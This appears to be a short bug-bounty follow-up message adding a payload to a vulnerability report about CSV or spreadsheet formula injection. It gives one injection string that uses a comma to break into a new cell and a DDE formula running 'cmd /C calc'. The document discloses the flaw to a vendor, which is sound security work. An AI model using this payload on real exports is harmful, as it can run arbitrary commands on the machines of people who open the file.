Summary:

Hi Ian,
I would like to add payload to this report #151516.  
payload used:
http://google.com?,=2+2-2+3+cmd|' /C calc'!G2

When injecting https://google.com? it will be rendered as a link but when comma (,) it will be rendered in a new cell which will execute the command.

Thanks,
